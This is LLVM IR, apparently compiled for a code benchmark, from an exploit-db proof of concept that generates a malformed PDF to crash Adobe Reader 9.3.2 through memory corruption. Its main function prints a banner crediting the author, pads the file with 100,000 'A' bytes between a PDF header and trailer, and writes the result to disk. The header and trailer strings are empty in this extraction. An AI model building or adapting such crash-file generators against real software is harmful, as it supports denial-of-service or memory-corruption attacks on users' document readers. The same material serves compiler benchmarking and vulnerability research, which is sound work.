; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_14121.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_14121.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [82 x i8] c"################################################################################\0A\00", align 1
@.str.2 = private unnamed_addr constant [79 x i8] c"\0AAdobe Reader 9.3.2 Portable Document Format Remote Memory Corruption/DoS PoC\0A\00", align 1
@.str.3 = private unnamed_addr constant [81 x i8] c"--------------------------------------------------------------------------------\00", align 1
@.str.4 = private unnamed_addr constant [47 x i8] c"\09by LiquidWorm <liquidworm gmail com> - 2010\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [81 x i8] c"################################################################################\00", align 1
@pdf_start = common dso_local global i8* null, align 8
@pdf_end = common dso_local global i8* null, align 8
@FFORMAT = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@fp = common dso_local global i32* null, align 8
@.str.7 = private unnamed_addr constant [28 x i8] c"\0AUweeepa! Can't open file.\0A\00", align 1
@.str.8 = private unnamed_addr constant [17 x i8] c"\0A\0AConceiving...\0A\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"[+]\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.11 = private unnamed_addr constant [30 x i8] c"\0AFile %s successfully born!\0A\07\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [252831 x i8], align 16
  %7 = alloca [100000 x i8], align 16
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.1, i64 0, i64 0))
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.2, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.3, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.4, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.5, i64 0, i64 0))
  %15 = getelementptr inbounds [100000 x i8], [100000 x i8]* %7, i64 0, i64 0
  %16 = call i32 @memset(i8* %15, i32 65, i32 100000)
  %17 = getelementptr inbounds [252831 x i8], [252831 x i8]* %6, i64 0, i64 0
  %18 = load i8*, i8** @pdf_start, align 8
  %19 = load i8*, i8** @pdf_start, align 8
  %20 = call i32 @strlen(i8* %19)
  %21 = call i32 @memcpy(i8* %17, i8* %18, i32 %20)
  %22 = getelementptr inbounds [252831 x i8], [252831 x i8]* %6, i64 0, i64 0
  %23 = load i8*, i8** @pdf_start, align 8
  %24 = call i32 @strlen(i8* %23)
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %22, i64 %25
  %27 = getelementptr inbounds [100000 x i8], [100000 x i8]* %7, i64 0, i64 0
  %28 = getelementptr inbounds [100000 x i8], [100000 x i8]* %7, i64 0, i64 0
  %29 = call i32 @strlen(i8* %28)
  %30 = call i32 @memcpy(i8* %26, i8* %27, i32 %29)
  %31 = getelementptr inbounds [252831 x i8], [252831 x i8]* %6, i64 0, i64 0
  %32 = load i8*, i8** @pdf_start, align 8
  %33 = call i32 @strlen(i8* %32)
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %31, i64 %34
  %36 = getelementptr inbounds [100000 x i8], [100000 x i8]* %7, i64 0, i64 0
  %37 = call i32 @strlen(i8* %36)
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %35, i64 %38
  %40 = load i8*, i8** @pdf_end, align 8
  %41 = load i8*, i8** @pdf_end, align 8
  %42 = call i32 @strlen(i8* %41)
  %43 = call i32 @memcpy(i8* %39, i8* %40, i32 %42)
  %44 = load i8*, i8** @FFORMAT, align 8
  %45 = call i32* @fopen(i8* %44, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  store i32* %45, i32** @fp, align 8
  %46 = load i32*, i32** @fp, align 8
  %47 = icmp eq i32* %46, null
  br i1 %47, label %48, label %50

48:                                               ; preds = %2
  %49 = call i32 @perror(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0))
  br label %50

50:                                               ; preds = %48, %2
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  store i32 5, i32* %8, align 4
  br label %52

52:                                               ; preds = %58, %50
  %53 = load i32, i32* %8, align 4
  %54 = icmp sgt i32 %53, 1
  br i1 %54, label %55, label %61

55:                                               ; preds = %52
  %56 = call i32 @puts(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0))
  %57 = call i32 @sleep(i32 1)
  br label %58

58:                                               ; preds = %55
  %59 = load i32, i32* %8, align 4
  %60 = add nsw i32 %59, -1
  store i32 %60, i32* %8, align 4
  br label %52

61:                                               ; preds = %52
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  %63 = getelementptr inbounds [252831 x i8], [252831 x i8]* %6, i64 0, i64 0
  %64 = load i32*, i32** @fp, align 8
  %65 = call i32 @fwrite(i8* %63, i32 1, i32 252831, i32* %64)
  %66 = load i32*, i32** @fp, align 8
  %67 = call i32 @fclose(i32* %66)
  %68 = load i8*, i8** @FFORMAT, align 8
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.11, i64 0, i64 0), i8* %68)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @puts(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
